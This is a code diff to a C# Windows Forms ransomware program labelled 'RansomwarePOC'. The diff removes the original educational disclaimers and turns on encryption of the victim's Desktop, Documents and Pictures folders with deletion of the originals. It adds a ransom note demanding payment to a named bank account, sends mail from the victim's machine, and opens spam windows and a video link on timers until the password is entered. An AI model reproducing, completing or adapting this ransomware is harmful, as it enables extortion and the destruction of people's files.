@@ -4,30 +4,22 @@ using System.Security.Cryptography;
 using System.Windows.Forms;
 using System.Net.Mail;
 using System.Net;
-using log4net.Util;
+using System.Diagnostics;
+using WindowsFormsApp1;
 
 namespace RansomwarePOC
 {
     public partial class Form1 : Form
     {
-        /*
-         *  THIS IS A PROOF OF CONCEPT. DO NOT USE THIS TO COMMIT CRIME.
-         *  I AM NOT RESPONSIBLE FOR YOU DOING DUMB STUFF.
-         *  THIS SOURCE HAS BEEN USED AND MADE AVAILABLE
-         *  FOR PRESENTATION AND EDUCATIONAL PURPOSES. 
-         */
-
-
-
         // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //
 
         private const bool DELETE_ALL_ORIGINALS = true; /* CAUTION */
         private const bool ENCRYPT_DESKTOP = true;
         private const bool ENCRYPT_DOCUMENTS = true;
         private const bool ENCRYPT_PICTURES = true;
-        private const string ENCRYPTED_FILE_EXTENSION = ".jcrypt";
+        private const string ENCRYPTED_FILE_EXTENSION = ".prd";
         //private const string ENCRYPT_PASSWORD = "Password1";
-        private const string ENCRYPT_PASSWORD = "Password1";
+        private const string ENCRYPT_PASSWORD = "ABCxyz123";
         //private const string BITCOIN_ADDRESS = "1BtUL5dhVXHwKLqSdhjyjK9Pe64Vc6CEH1";
         private const string BITCOIN_ADDRESS = "19036564054017, Techcombank, Nguyen Duy Hoan";
         //private const string EMAIL_ADDRESS = "this.email.address@gmail.com";
@@ -39,13 +31,6 @@ namespace RansomwarePOC
 
 
         private static string ENCRYPTION_LOG = "";
-        /*private string RANSOM_LETTER =
-           "All of your files have been encrypted.\n\n" +
-           "To unlock them, please send " + BITCOIN_RANSOM_AMOUNT + " bitcoin(s) to BTC address: " + BITCOIN_ADDRESS + "\n" +
-           "Afterwards, please email your transaction ID to: " + EMAIL_ADDRESS + "\n\n" +
-           "Thank you and have a nice day!\n\n" +
-           "Encryption Log:\n" +
-           "----------------------------------------\n";*/
         private string RANSOM_LETTER =
            "All of your files have been encrypted.\n\n" +
            "To unlock them, please send your money to this bank account address: " + BITCOIN_ADDRESS + "\n" +
@@ -54,20 +39,9 @@ namespace RansomwarePOC
            "Encryption Log:\n" +
            "----------------------------------------\n";
         private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
-        //private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+        private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
         private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
         private static int encryptedFileCount = 0;
-
-        /*
-         *  THIS IS A PROOF OF CONCEPT. DO NOT USE THIS TO COMMIT CRIME.
-         *  I AM NOT RESPONSIBLE FOR YOU DOING DUMB STUFF.
-         *  THIS SOURCE HAS BEEN USED AND MADE AVAILABLE
-         *  FOR PRESENTATION AND EDUCATIONAL PURPOSES. 
-         */
-
-
-
-
 
         // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //
 
@@ -75,51 +49,72 @@ namespace RansomwarePOC
         private const bool DECRYPT_DESKTOP = true;
         private const bool DECRYPT_DOCUMENTS = true;
         private const bool DECRYPT_PICTURES = true;
-        //private const string ENCRYPTED_FILE_EXTENSION = ".jcrypt";
-        //private const string ENCRYPT_PASSWORD = "Password1";
 
         // ----------------------------- END -------------------------------- //
 
-        //private static string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
-        //private static string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-        //private static string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
         private static string DECRYPTION_LOG = "";
         private static int decryptedFileCount = 0;
+        private bool stopSpam = false;
 
         public Form1()
         {
             InitializeComponent();
 
             SendMailFromVictim();
+
+            Timer tmr = new Timer();
+            tmr.Interval = 10000;
+            tmr.Tick += Tmr_Tick;
+            tmr.Start();
+
+            Timer tmr2 = new Timer();
+            tmr2.Interval = 5000;
+            tmr2.Tick += Tmr_Tick2;
+            tmr2.Start();
+
             //GeneratePassword(ENCRYPT_PASSWORD);
         }
 
-        public void GeneratePassword(string pass)
+        private void Tmr_Tick(object sender, EventArgs e)
+        {
+            if (stopSpam == false)
+                Process.Start("https://youtu.be/_UcFKFYsJ-E");
+        }
+
+        private void Tmr_Tick2(object sender, EventArgs e)
+        {
+            SpamForm1 sf1 = new SpamForm1();
+
+            if (stopSpam == false)
+                sf1.Show();
+        }
+
+        /*public void GeneratePassword(string pass)
         {
             Random rd = new Random();
             int rand_num = rd.Next(100000, 999999);
 
             pass = rand_num.ToString();
-        }
+        }*/
 
         private void Form1_Load(object sender, EventArgs e)
         {
             initializeForm();
 
-            /*if (ENCRYPT_DESKTOP)
+            if (ENCRYPT_DESKTOP)
             {
                 encryptFolderContents(DESKTOP_FOLDER);
-            }*/
+            }
 
             if (ENCRYPT_PICTURES)
             {
                 encryptFolderContents(PICTURES_FOLDER);
             }
 
-            /*if (ENCRYPT_DOCUMENTS)
+            if (ENCRYPT_DOCUMENTS)
             {
                 encryptFolderContents(DOCUMENTS_FOLDER);
-            }*/
+            }
 
             if (encryptedFileCount > 0)
             {
@@ -249,7 +244,7 @@ namespace RansomwarePOC
             }
         }
 
-        private static void FileDecrypt(string inputFile, string outputFile, string password)
+        /*private static void FileDecrypt(string inputFile, string outputFile, string password)
         {
             byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
             byte[] salt = new byte[32];
@@ -303,7 +298,7 @@ namespace RansomwarePOC
                 fileStreamOutput.Close();
                 cryptoFileStream.Close();
             }
-        }
+        }*/
 
         public static byte[] GenerateRandomSalt()
         {
@@ -325,6 +320,10 @@ namespace RansomwarePOC
         {
             if (PasswordTextBox.Text == ENCRYPT_PASSWORD)
             {
+                stopSpam = true;
+
+                SpamForm1.stopSpamPic = true;
+
                 DecrypterPOC();
 
                 string message = "Thanks for your money and have a good day!";
@@ -363,20 +362,20 @@ namespace RansomwarePOC
 
         public void DecrypterPOC()
         {
-            /*if (DECRYPT_DESKTOP)
+            if (DECRYPT_DESKTOP)
             {
                 decryptFolderContents(DESKTOP_FOLDER);
-            }*/
+            }
 
             if (DECRYPT_PICTURES)
             {
                 decryptFolderContents(PICTURES_FOLDER);
             }
 
-            /*if (DECRYPT_DOCUMENTS)
+            if (DECRYPT_DOCUMENTS)
             {
                 decryptFolderContents(DOCUMENTS_FOLDER);
-            }*/
+            }
 
             if (decryptedFileCount > 0)
             {
